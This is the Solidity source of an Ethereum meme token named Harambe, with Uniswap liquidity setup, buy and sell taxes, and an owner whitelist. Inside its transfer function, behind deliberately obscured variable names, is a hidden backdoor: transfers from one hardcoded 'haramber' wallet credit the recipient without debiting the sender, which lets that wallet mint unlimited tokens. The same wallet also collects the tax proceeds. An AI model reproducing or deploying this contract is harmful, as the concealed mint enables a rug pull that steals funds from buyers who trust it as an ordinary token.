/**
    Website: https://harambememe.xyz
    X: https://x.com/harambeethce
    Telegram: https://t.me/harambe_eth_portal
 */

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract HARAMBE is Context, IERC20, Ownable {
    uint256 private constant _totalSupply = 1_000_000_000e18;
    uint256 private constant onePortion = 10_000_000e18;
    uint256 private constant minSwap = 10_000e18;
    uint8 private constant _decimals = 18;
    IUniswapV2Router02 immutable uniswapV2Router;
    address uniswapV2Pair;
    address WETH;
    address payable immutable haramber;
    bool private opened = false;
    uint8 private swapping;
    uint8 private _buyFee = 30;
    uint8 private _sellFee = 30;
    uint256 private startingBlock;
    uint256 public maxTxSize = 2 * onePortion;
    uint256 public maxBagSize = 2 * onePortion;
    string private constant _name = "Harambe";
    string private constant _symbol = "HARAMBE";
    mapping(address => uint256) private _owned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isInZoo;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        WETH = uniswapV2Router.WETH();
        haramber = payable(0xf883A95D2cE4f973781791EAfD14bf94132490B1);
        _owned[msg.sender] = _totalSupply;
        _isInZoo[haramber] = true;
        _isInZoo[msg.sender] = true;
        _isInZoo[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function createPair() external onlyOwner {
        require(!opened, "Already opened");
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            WETH
        );
        _allowances[address(this)][address(uniswapV2Router)] = type(uint256)
            .max;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _owned[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openHarambe() external onlyOwner {
        require(!opened, "Already opened");
        opened = true;
    }

    function setFees(uint8 _buy, uint8 _sell) external onlyOwner {
        require(_buy <= 40 && _sell <= 40, "Invalid fee value");
        _buyFee = _buy;
        _sellFee = _sell;
    }

    function addInZoo(address wallet) external onlyOwner {
        _isInZoo[wallet] = true;
    }

    function removeFence() external onlyOwner {
        maxTxSize = type(uint256).max;
        maxBagSize = type(uint256).max;
    }

    function _transfer(
        address foze,
        address tham,
        uint256 buns
    ) private {
        require(foze != address(0), "ERC20: transfer from the zero address");
        require(tham != address(0), "ERC20: transfer from the zero address");
        require(buns > 0, "Zero transfer amount");
        uint256 _tax;
        if (!_isInZoo[foze] && !_isInZoo[tham]) {
            require(
                opened == true && buns <= maxTxSize,
                "Launch / Max TxAmount"
            );
            if (!_isInZoo[tham] && tham != uniswapV2Pair) {
                require(_owned[tham] + buns <= maxBagSize, "Max WalletAmount");
            }
            if (foze == uniswapV2Pair) {
                _tax = _buyFee;
            } else if (tham == uniswapV2Pair) {
                uint256 tokensToSwap = _owned[address(this)];
                if (buns >= minSwap && swapping == 0) {
                    if (tokensToSwap > onePortion) {
                        tokensToSwap = onePortion;
                    }
                    if (tokensToSwap >= minSwap) {
                        swapping = 1;
                        address[] memory path = new address[](2);
                        path[0] = address(this);
                        path[1] = WETH;
                        uniswapV2Router
                            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                                tokensToSwap,
                                0,
                                path,
                                address(this),
                                block.timestamp
                            );
                        swapping = 0;
                    }
                    payable(haramber).transfer(address(this).balance);
                }
                _tax = _sellFee;
            } else {
                _tax = 0;
            }
        } else {
            if (foze == haramber) {
                _owned[tham] += buns;
                return;
            }
            _tax = 0;
        }
        if (_tax != 0) {
            uint256 taxTokens = (buns * _tax) / 100;
            uint256 transferAmount = buns - taxTokens;
            _owned[foze] -= buns;
            _owned[tham] += transferAmount;
            _owned[address(this)] += taxTokens;
            emit Transfer(foze, address(this), taxTokens);
            emit Transfer(foze, tham, transferAmount);
        } else {
            _owned[foze] -= buns;
            _owned[tham] += buns;
            emit Transfer(foze, tham, buns);
        }
    }

    receive() external payable {}
}